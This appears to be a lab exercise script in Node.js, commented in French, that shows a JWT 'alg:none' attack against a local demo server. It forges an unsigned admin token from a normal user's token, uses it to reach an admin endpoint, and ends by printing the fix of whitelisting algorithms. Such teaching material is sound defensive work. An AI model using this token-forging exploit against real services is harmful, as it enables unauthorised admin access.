/**
 * ATTAQUE 1 — alg:none
 * =====================
 * Un JWT est composé de trois parties : header.payload.signature
 * Si le serveur fait confiance à l'algorithme déclaré dans le header
 * sans le valider contre une whitelist, un attaquant peut déclarer
 * "alg":"none" et omettre la signature — le serveur accepte n'importe
 * quel payload sans vérification.
 *
 * Scénario :
 *   1. On se connecte avec un compte utilisateur normal (role: user)
 *   2. On extrait le payload du token JWT reçu
 *   3. On modifie le rôle en "admin" et on change l'algorithme en "none"
 *   4. On reconstruit le token sans signature
 *   5. On accède à l'endpoint /api/admin (normalement réservé aux admins)
 *
 * Usage : node attacks/1_alg_none.js
 */

const BASE_URL = 'http://localhost:3000';

// ─── Encodage/décodage Base64url ─────────────────────────────────────────────

function b64Encode(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

function b64Decode(str) {
  return JSON.parse(Buffer.from(str, 'base64url').toString('utf8'));
}

// ─── Affichage ───────────────────────────────────────────────────────────────

function banner(title) {
  console.log('\n' + '─'.repeat(60));
  console.log(' ' + title);
  console.log('─'.repeat(60));
}

// ─── Attaque ─────────────────────────────────────────────────────────────────

async function run() {
  banner('ATTAQUE 1 : alg:none — forge de token sans signature');

  // Étape 1 : connexion avec un compte utilisateur normal
  console.log('\n[1] Connexion avec alice (role: user)...');
  const loginRes = await fetch(`${BASE_URL}/auth/login`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ username: 'alice', password: 'password123' }),
  });
  const { token: legitimateToken } = await loginRes.json();
  console.log('    Token légitime :', legitimateToken);

  // Étape 2 : décodage du token JWT (header + payload)
  const [headerB64, payloadB64] = legitimateToken.split('.');
  const originalHeader  = b64Decode(headerB64);
  const originalPayload = b64Decode(payloadB64);

  console.log('\n[2] Décodage du token :');
  console.log('    Header  :', JSON.stringify(originalHeader));
  console.log('    Payload :', JSON.stringify(originalPayload));

  // Étape 3 : modification du payload + remplacement de l'algorithme
  console.log('\n[3] Forge du token malveillant...');
  const forgedHeader  = b64Encode({ alg: 'none', typ: 'JWT' });
  const forgedPayload = b64Encode({ ...originalPayload, role: 'admin' });
  // La signature est vide (ou absente) — le serveur vulnérable n'en a pas besoin
  const forgedToken = `${forgedHeader}.${forgedPayload}.`;

  console.log('    Header forgé  :', JSON.stringify({ alg: 'none', typ: 'JWT' }));
  console.log('    Payload forgé :', JSON.stringify({ ...originalPayload, role: 'admin' }));
  console.log('    Token forgé   :', forgedToken);

  // Étape 4 : tentative d'accès à l'endpoint admin avec le token forgé
  console.log('\n[4] Accès à /api/admin avec le token alg:none...');
  const adminRes = await fetch(`${BASE_URL}/api/admin`, {
    headers: { Authorization: `Bearer ${forgedToken}` },
  });
  const adminData = await adminRes.json();

  if (adminRes.ok) {
    console.log('\n✅ ATTAQUE RÉUSSIE — accès admin obtenu sans connaître le secret !');
    console.log('   Réponse :', JSON.stringify(adminData, null, 2));
  } else {
    console.log('\n❌ Attaque échouée (serveur probablement durci).');
    console.log('   Réponse :', JSON.stringify(adminData));
  }

  // Étape 5 : vérification que le compte alice seul est bien refusé
  console.log('\n[5] Contrôle : /api/admin avec le token légitime d\'alice (role:user)...');
  const checkRes = await fetch(`${BASE_URL}/api/admin`, {
    headers: { Authorization: `Bearer ${legitimateToken}` },
  });
  const checkData = await checkRes.json();
  console.log('    HTTP', checkRes.status, '—', checkData.error || checkData.message);

  banner('FIN DE L\'ATTAQUE 1');
  console.log('\nCorrection : utiliser une whitelist d\'algorithmes côté serveur.');
  console.log('Exemple Node.js :  jwt.verify(token, secret, { algorithms: ["HS256"] })\n');
}

run().catch(err => {
  console.error('\n[ERREUR] Impossible de contacter le serveur :', err.message);
  console.error('→ Assurez-vous que le serveur est lancé : node server.js\n');
  process.exit(1);
});
